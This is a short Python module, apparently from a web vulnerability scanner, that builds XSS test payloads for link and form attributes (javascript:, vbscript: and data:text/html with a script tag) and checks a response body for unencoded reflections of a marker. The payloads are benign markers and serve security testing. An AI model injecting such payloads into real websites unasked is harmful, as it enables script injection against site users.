import re
from typing import List, Optional

from .common import WITCHER_MARKER, html_unescape


def build_payloads(quote: Optional[str] = None) -> List[str]:
    return [
        f"javascript:alert({WITCHER_MARKER})",
        f"javascript:var a='{WITCHER_MARKER}'",
        f"data:text/html,<script>{WITCHER_MARKER}</script>",
        f"vbscript:msgbox({WITCHER_MARKER})",
    ]


def is_success(body: str) -> bool:
    attr_re = re.compile(r"(href|src|action)\s*=\s*(\"[^\"]*\"|'[^']*'|[^\s>]+)", re.IGNORECASE)
    for match in attr_re.finditer(body):
        value = match.group(2).strip()
        if value and value[0] in {"'", '"'} and value[-1] == value[0]:
            value = value[1:-1]
        decoded = html_unescape(value)
        lower = value.lower()
        decoded_lower = decoded.lower()
        if lower.startswith("javascript:"):
            code = value.split(":", 1)[1].strip()
            if WITCHER_MARKER in code and re.search(r"\w+\s*\(|\b(var|let|const)\b", code):
                return True
        if decoded_lower.startswith("javascript:"):
            return False
        if lower.startswith("vbscript:"):
            code = value.split(":", 1)[1].strip()
            if WITCHER_MARKER in code and re.search(r"\w+\s*\(", code):
                return True
        if decoded_lower.startswith("vbscript:"):
            return False
        if lower.startswith("data:text/html"):
            parts = value.split(",", 1)
            if len(parts) == 2 and re.search(r"<script>\s*%s\s*</script>" % WITCHER_MARKER, parts[1], re.IGNORECASE):
                return True
        if decoded_lower.startswith("data:"):
            return False
    return False
